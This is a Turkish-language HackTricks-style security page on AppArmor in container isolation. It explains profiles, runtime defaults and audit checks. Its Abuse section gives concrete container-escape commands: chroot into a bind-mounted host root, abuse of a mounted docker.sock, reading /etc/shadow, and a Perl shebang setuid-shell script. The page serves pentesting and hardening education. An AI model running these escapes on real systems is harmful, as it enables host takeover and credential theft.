# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Container Isolation'daki Rolü

AppArmor, program başına profiller aracılığıyla kısıtlamalar uygulayan bir **Mandatory Access Control** sistemidir. Büyük ölçüde kullanıcı ve grup sahipliğine bağlı olan geleneksel DAC kontrollerinin aksine AppArmor, kernel'in sürecin kendisine bağlı bir policy'yi zorunlu kılmasını sağlar. Container ortamlarında bu önemlidir; çünkü bir workload bir eylemi gerçekleştirmeye yetecek geleneksel ayrıcalıklara sahip olsa bile AppArmor profili ilgili path'e, mount işlemine, network davranışına veya capability kullanımına izin vermediği için işlem reddedilebilir.

En önemli kavramsal nokta, AppArmor'un **path-based** olmasıdır. AppArmor, SELinux'un yaptığı gibi label'lar yerine path kuralları üzerinden filesystem erişimini değerlendirir. Bu yaklaşım sistemi anlaşılır ve güçlü kılar; ancak bind mount'ların ve alternatif path düzenlerinin dikkatle incelenmesi gerektiği anlamına da gelir. Aynı host içeriğine farklı bir path üzerinden erişilebilir hâle gelirse policy'nin etkisi, operatörün başlangıçta beklediği gibi olmayabilir.

## Container Isolation'daki Rolü

Container security incelemeleri genellikle capabilities ve seccomp ile sınırlı kalır; ancak AppArmor bu kontrollerden sonra da önemini korur. Gereğinden fazla ayrıcalığa sahip bir container veya operasyonel nedenlerle bir capability daha gerektiren bir workload düşünün. AppArmor yine de file access, mount davranışı, networking ve execution pattern'lerini kısıtlayarak bariz abuse path'lerini durdurabilir. Bu nedenle AppArmor'u "uygulamayı çalıştırabilmek" için devre dışı bırakmak, yalnızca riskli olan bir yapılandırmayı fark edilmeden aktif olarak exploitable bir yapılandırmaya dönüştürebilir.

## Lab

Host üzerinde AppArmor'un aktif olup olmadığını kontrol etmek için şunu kullanın:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Mevcut container process'inin hangi kullanıcı altında çalıştığını görmek için:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Fark öğreticidir. Normal durumda süreç, runtime tarafından seçilen profile bağlı bir AppArmor context göstermelidir. Unconfined durumunda ise bu ek kısıtlama katmanı ortadan kalkar.

Docker'ın uyguladığını düşündüğü ayarları da inceleyebilirsiniz:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Runtime Kullanımı

Docker, host bunu desteklediğinde varsayılan veya özel bir AppArmor profili uygulayabilir. Podman da AppArmor tabanlı sistemlerde AppArmor ile entegre olabilir; ancak SELinux öncelikli dağıtımlarda genellikle diğer MAC sistemi ön plana çıkar. Kubernetes, AppArmor'ı gerçekten destekleyen node'larda workload düzeyinde AppArmor policy sunabilir. LXC ve benzer Ubuntu-family system-container ortamları da AppArmor'ı kapsamlı şekilde kullanır.

Pratik açıdan önemli nokta, AppArmor'ın bir "Docker özelliği" olmamasıdır. AppArmor, çeşitli runtime'ların uygulamayı tercih edebileceği bir host-kernel özelliğidir. Host bunu desteklemiyorsa veya runtime unconfined çalışacak şekilde yapılandırılmışsa, varsayılan koruma gerçekte mevcut değildir.

Kubernetes özelinde modern API `securityContext.appArmorProfile`'dır. Kubernetes `v1.30` itibarıyla eski beta AppArmor annotation'ları deprecated durumdadır. Desteklenen host'larda `RuntimeDefault` varsayılan profildir; `Localhost` ise node üzerinde önceden yüklenmiş olması gereken bir profile işaret eder. Bu durum inceleme sırasında önemlidir; çünkü bir manifest AppArmor-aware görünebilir, ancak tamamen node tarafındaki desteğe ve önceden yüklenmiş profillere bağlı olabilir.

İnce ama operasyonel açıdan faydalı bir ayrıntı, `appArmorProfile.type: RuntimeDefault` değerini açıkça ayarlamanın alanı yalnızca atlamaktan daha katı olmasıdır. Alan açıkça ayarlanmışsa ve node AppArmor'ı desteklemiyorsa admission başarısız olmalıdır. Alan atlanırsa workload, AppArmor olmayan bir node üzerinde yine çalışabilir ve yalnızca bu ek confinement katmanını almayabilir. Bir attacker's point of view açısından bu, hem manifest'i hem de gerçek node durumunu kontrol etmek için iyi bir nedendir.

Docker-capable AppArmor host'larında en iyi bilinen varsayılan `docker-default`'tur. Bu profil Moby'nin AppArmor template'inden oluşturulur ve bazı capability-based PoC'lerin varsayılan bir container'da neden hâlâ başarısız olduğunu açıklaması açısından önemlidir. Genel olarak `docker-default`, normal networking'e izin verir, `/proc`'un büyük bölümüne yazmayı engeller, `/sys`'un hassas bölümlerine erişimi reddeder, mount operation'larını engeller ve ptrace'i genel bir host-probing primitive'i olmayacak şekilde kısıtlar. Bu baseline'ı anlamak, "container'da `CAP_SYS_ADMIN` var" ile "container bu capability'yi önem verdiğim kernel interface'lerine karşı gerçekten kullanabiliyor" ifadelerini birbirinden ayırmaya yardımcı olur.

## Profile Management

AppArmor profilleri genellikle `/etc/apparmor.d/` altında saklanır. Yaygın bir naming convention, executable path içindeki slash karakterlerini dot karakterleriyle değiştirmektir. Örneğin `/usr/bin/man` için bir profil genellikle `/etc/apparmor.d/usr.bin.man` olarak saklanır. Bu ayrıntı hem defense hem de assessment sırasında önemlidir; çünkü active profile adını öğrendiğinizde, host üzerindeki karşılık gelen dosyayı çoğu zaman hızlıca bulabilirsiniz.

Yararlı host-side management command'ları şunlardır:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Bu komutların container güvenliği referansında önemli olmasının nedeni, profillerin gerçekte nasıl oluşturulduğunu, yüklendiğini, complain mode'a geçirildiğini ve uygulama değişikliklerinden sonra değiştirildiğini açıklamalarıdır. Bir operatör troubleshooting sırasında profilleri complain mode'a geçirme ve enforcement'ı geri yüklemeyi unutma alışkanlığına sahipse container, dokümantasyonda korunuyor gibi görünürken gerçekte çok daha gevşek davranabilir.

### Profilleri Oluşturma Ve Güncelleme

`aa-genprof`, uygulama davranışını izleyebilir ve etkileşimli olarak bir profil oluşturmaya yardımcı olabilir:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof`, daha sonra `apparmor_parser` ile yüklenebilecek bir şablon profili oluşturabilir:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Binary değiştiğinde ve policy'nin güncellenmesi gerektiğinde, `aa-logprof` loglarda bulunan retleri yeniden oynatabilir ve operatörün bunlara izin verip vermemeye karar vermesine yardımcı olabilir:
```bash
sudo aa-logprof
```
### Günlükler

AppArmor engellemeleri genellikle `auditd`, syslog veya `aa-notify` gibi araçlar üzerinden görülebilir:
```bash
sudo aa-notify -s 1 -v
```
Bu, operasyonel ve saldırı amaçlı olarak kullanışlıdır. Savunmacılar profilleri iyileştirmek için bunu kullanır. Saldırganlar ise hangi kesin path veya operation'ın reddedildiğini ve AppArmor'ın bir exploit chain'i engelleyen kontrol olup olmadığını öğrenmek için kullanır.

### Kesin Profile Dosyasını Belirleme

Bir runtime bir container için belirli bir AppArmor profile adı gösterdiğinde, bu adı diskteki profile dosyasına eşlemek genellikle yararlıdır:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Bu, özellikle host-side inceleme sırasında oldukça kullanışlıdır; çünkü "container, `lowpriv` profili altında çalıştığını söylüyor" ile "gerçek kurallar denetlenebilecek veya yeniden yüklenebilecek bu belirli dosyada bulunuyor" arasındaki boşluğu kapatır.

### Denetlenmesi Gereken High-Signal Kurallar

Bir profili okuyabildiğinizde yalnızca basit `deny` satırlarıyla yetinmeyin. Birkaç kural türü, AppArmor'un bir container escape attempt'ine karşı ne kadar etkili olacağını önemli ölçüde değiştirir:

- `ux` / `Ux`: hedef binary'yi unconfined olarak çalıştırır. Ulaşılabilir bir helper, shell veya interpreter `ux` altında izinliyse genellikle test edilmesi gereken ilk şey budur.
- `px` / `Px` ve `cx` / `Cx`: exec sırasında profile transition gerçekleştirir. Bunlar otomatik olarak kötü değildir; ancak bir transition mevcut profilden çok daha geniş bir profile ulaşabileceğinden denetlenmeye değerdir.
- `change_profile`: bir task'ın hemen veya bir sonraki exec işleminde başka bir loaded profile'a geçmesine izin verir. Hedef profile daha zayıfsa bu, restrictive bir domain'den çıkmak için amaçlanan escape hatch haline gelebilir.
- `flags=(complain)`, `flags=(unconfined)` veya daha yeni `flags=(prompt)`: bunlar profile ne kadar güvenmeniz gerektiğini değiştirmelidir. `complain`, denial'ları enforce etmek yerine log'lar; `unconfined`, boundary'yi kaldırır; `prompt` ise tamamen kernel tarafından uygulanan bir deny yerine userspace karar yoluna bağlıdır.
- `userns` veya `userns create,`: daha yeni AppArmor policy, user namespace oluşturulmasını mediate edebilir. Bir container profili buna açıkça izin veriyorsa platform, hardening stratejisinin bir parçası olarak AppArmor kullansa bile nested user namespace'ler hâlâ devrede kalır.

Kullanışlı host-side grep:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Bu tür bir audit, yüzlerce sıradan file rule satırını incelemekten çoğu zaman daha kullanışlıdır. Bir breakout; bir helper çalıştırmaya, yeni bir namespace'e girmeye veya daha az kısıtlayıcı bir profile geçmeye bağlıysa, yanıt çoğu zaman açıkça görünen `deny /etc/shadow r` tarzı satırlarda değil, bu geçiş odaklı rule'larda gizlidir.

## Misconfigurations

En belirgin hata `apparmor=unconfined` kullanmaktır. Administrators bunu çoğu zaman, profile tehlikeli veya beklenmeyen bir şeyi doğru şekilde engellediği için başarısız olan bir application'ı debug ederken ayarlar. Flag production ortamında kalırsa, tüm MAC layer etkin şekilde kaldırılmış olur.

Bir diğer ince problem, file permissions normal göründüğü için bind mounts'ların zararsız olduğunu varsaymaktır. AppArmor path-based olduğundan, host path'lerini alternatif mount konumları altında açığa çıkarmak path rule'larıyla kötü şekilde etkileşebilir. Üçüncü bir hata ise config file içindeki bir profile adının, host kernel'i gerçekten AppArmor enforcement yapmıyorsa çok az anlam ifade ettiğini unutmaktır.

## Abuse

AppArmor ortadan kalktığında, daha önce kısıtlanmış olan işlemler aniden çalışabilir: bind mounts üzerinden sensitive path'leri okumak, normalde kullanılması daha zor olması gereken procfs veya sysfs bölümlerine erişmek, capabilities/seccomp de izin veriyorsa mount ile ilgili işlemler gerçekleştirmek veya bir profile'ın normalde deny edeceği path'leri kullanmak. AppArmor çoğu zaman capability-based bir breakout attempt'inin teoride “çalışması gerekirken” pratikte neden başarısız olduğunu açıklayan mekanizmadır. AppArmor'ı kaldırın; aynı attempt başarılı olmaya başlayabilir.

Bir path-traversal, bind-mount veya mount-based abuse chain'i durduran asıl şeyin AppArmor olduğundan şüpheleniyorsanız, ilk adım genellikle bir profile ile profile olmadan nelerin erişilebilir hâle geldiğini karşılaştırmaktır. Örneğin bir host path'i container içine mount edilmişse, öncelikle bu path'te ilerleyip ilerleyemediğinizi ve path'i okuyup okuyamadığınızı kontrol ederek başlayın:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Container’da `CAP_SYS_ADMIN` gibi tehlikeli bir capability de varsa, en pratik testlerden biri mount işlemlerini veya hassas kernel filesystem’lerine erişimi engelleyen kontrolün AppArmor olup olmadığını belirlemektir:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Bir host path'i bind mount aracılığıyla zaten erişilebilir durumdaysa, AppArmor'un devre dışı kalması read-only bir information-disclosure sorununu doğrudan host dosyalarına erişime dönüştürebilir:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Bu komutların amacı, breakout'u tek başına AppArmor'un oluşturduğunu göstermek değildir. AppArmor kaldırıldığında, birçok filesystem ve mount tabanlı abuse path'in hemen test edilebilir hâle gelmesidir.

### Tam Örnek: AppArmor Devre Dışı + Host Root Mounted

Container zaten host root'u `/host` konumuna bind-mounted olarak içeriyorsa, AppArmor'un kaldırılması engellenmiş bir filesystem abuse path'ini tam bir host escape'e dönüştürebilir:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Shell host filesystem üzerinden çalışmaya başladığında, workload fiilen container sınırından kaçmış olur:
```bash
id
hostname
cat /etc/shadow | head
```
### Tam Örnek: AppArmor Devre Dışı + Runtime Socket

Gerçek engel runtime state çevresindeki AppArmor ise, tamamen escape etmek için mounted bir socket yeterli olabilir:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kesin yol mount noktasına bağlıdır, ancak nihai sonuç aynıdır: AppArmor artık runtime API'ye erişimi engellemez ve runtime API, host'u ele geçirebilecek bir container başlatabilir.

### Tam Örnek: Path-Based Bind-Mount Bypass

AppArmor path-based olduğundan, `/proc/**` koruması aynı host procfs içeriğini farklı bir yol üzerinden erişilebilir olduğunda otomatik olarak korumaz:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Etki, tam olarak neyin mount edildiğine ve alternatif path'in diğer kontrolleri de bypass edip etmediğine bağlıdır; ancak bu pattern, AppArmor'un izolasyon içinde değil, mount düzeniyle birlikte değerlendirilmesi gerektiğinin en açık nedenlerinden biridir.

### Full Example: Shebang Bypass

AppArmor policy bazen bir interpreter path'ini, shebang işleme mekanizması üzerinden script çalıştırılmasını tam olarak hesaba katmayacak şekilde hedefler. Tarihsel bir örnekte, ilk satırı confined bir interpreter'a işaret eden bir script kullanılmıştır:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Bu tür bir örnek, profil amacının ve gerçek yürütme semantiğinin birbirinden farklı olabileceğini hatırlatmak açısından önemlidir. Container ortamlarında AppArmor incelenirken interpreter zincirleri ve alternatif yürütme yolları özel dikkat gerektirir.

## Kontroller

Bu kontrollerin amacı üç soruyu hızlıca yanıtlamaktır: Host üzerinde AppArmor etkin mi, mevcut process kısıtlanmış mı ve runtime gerçekten bu container'a bir profil uygulamış mı?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Burada ilginç olanlar:

- `/proc/self/attr/current` `unconfined` gösteriyorsa workload, AppArmor confinement özelliğinden yararlanmıyordur.
- `aa-status`, AppArmor'ın devre dışı olduğunu veya yüklenmediğini gösteriyorsa runtime config içindeki herhangi bir profile adı büyük ölçüde kozmetiktir.
- `docker inspect`, `unconfined` veya beklenmeyen bir custom profile gösteriyorsa bu genellikle filesystem veya mount tabanlı bir abuse path'in çalışmasının nedenidir.
- `/sys/kernel/security/apparmor/profiles`, beklediğiniz profile'ı içermiyorsa runtime veya orchestrator yapılandırması tek başına yeterli değildir.
- Sözde hardened bir profile `ux`, geniş kapsamlı `change_profile`, `userns` veya `flags=(complain)` tarzı kurallar içeriyorsa pratik sınır, profile adının düşündürdüğünden çok daha zayıf olabilir.

Bir container operasyonel nedenlerle zaten elevated privileges'a sahipse AppArmor'ı etkin bırakmak, kontrollü bir istisna ile çok daha geniş bir security failure arasındaki farkı çoğu zaman belirler.

## Runtime Varsayılanları

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatma |
| --- | --- | --- | --- |
| Docker Engine | AppArmor destekli host'larda varsayılan olarak etkin | Override edilmediği sürece `docker-default` AppArmor profile'ını kullanır | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host'a bağlı | AppArmor, `--security-opt` aracılığıyla desteklenir; ancak tam varsayılan davranış host/runtime'a bağlıdır ve Docker'ın belgelenmiş `docker-default` profile'ından daha az evrenseldir | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Koşullu varsayılan | `appArmorProfile.type` belirtilmezse varsayılan `RuntimeDefault` olur; ancak bu yalnızca node üzerinde AppArmor etkinse uygulanır | `securityContext.appArmorProfile.type: Unconfined`, zayıf bir profile sahip `securityContext.appArmorProfile.type: Localhost`, AppArmor desteği olmayan node'lar |
| Kubernetes altında containerd / CRI-O | Node/runtime desteğini takip eder | Kubernetes tarafından desteklenen yaygın runtime'lar AppArmor'ı destekler; ancak gerçek enforcement yine node desteğine ve workload ayarlarına bağlıdır | Kubernetes satırındakiyle aynıdır; doğrudan runtime yapılandırması AppArmor'ı tamamen atlayabilir |

AppArmor için en önemli değişken çoğu zaman yalnızca runtime değil, **host**'tur. Bir manifest içindeki profile ayarı, AppArmor'ın etkin olmadığı bir node üzerinde confinement oluşturmaz.

## Referanslar

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
